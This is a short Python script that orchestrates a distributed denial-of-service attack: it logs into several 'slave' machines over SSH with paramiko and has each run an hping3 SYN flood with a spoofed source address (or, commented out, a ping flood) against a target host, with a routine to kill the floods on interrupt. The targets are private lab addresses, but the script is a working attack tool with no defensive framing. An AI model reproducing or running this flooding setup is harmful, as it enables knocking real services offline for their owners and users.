import paramiko
import threading
import sys

slaves = [
    {"hostname": "10.69.69.42", "username": "berardinux"},
    {"hostname": "10.69.69.184", "username": "berardinux"},
    {"hostname": "127.0.0.1", "username": "root"},
]

# Syn flood attack
# How set up $(sudo hping3 --flood -S --spoof {spoof IPV4} {victem IPV4} - {PortNumber})
command = "sudo hping3 --flood -S --spoof 10.69.69.0 10.69.69.145 -p 80"
# Ping flood attack
#command = "sudo hping3 --flood -1 10.69.69.113

# Command to stop attack by killing all instances
stop_command = "sudo killall hping3"

def run_command_on_slave(slave, command):
    hostname = slave["hostname"]
    username = slave["username"]

    ssh = None
    try:
        # Create SSH connection
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname, username=username)

        # Start attack
        print(f"[{hostname}] Starting hping3")
        stdin, stdout, stderr = ssh.exec_command(command)

        while True:
            if ssh.get_transport().is_active():
                pass
            else:
                break

    except Exception as e:
        print(f"[{hostname}] Error: {e}")
    finally:
        if ssh:
            ssh.close()

# Stop attack
def stop_all_slaves():
    print("[Master] Stopping hping3 on all slaves.")
    for slave in slaves:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(slave["hostname"], username=slave["username"])
            ssh.exec_command(stop_command)
            print(f"[{slave['hostname']}] Sent stop command.")
        except Exception as e:
            print(f"[{slave['hostname']}] Error sending stop command: {e}")
        finally:
            ssh.close()

# Run each command on a separate thread
try:
    threads = []
    for slave in slaves:
        thread = threading.Thread(target=run_command_on_slave, args=(slave, command))
        thread.start()
        threads.append(thread)

    # Wait for all threads
    for thread in threads:
        thread.join()

except KeyboardInterrupt:
    print("\n[Master] KeyboardInterrupt detected. Stopping all slaves.")
    stop_all_slaves()
    sys.exit(0)

finally:
    print("[Master] All processes stopped.")
    

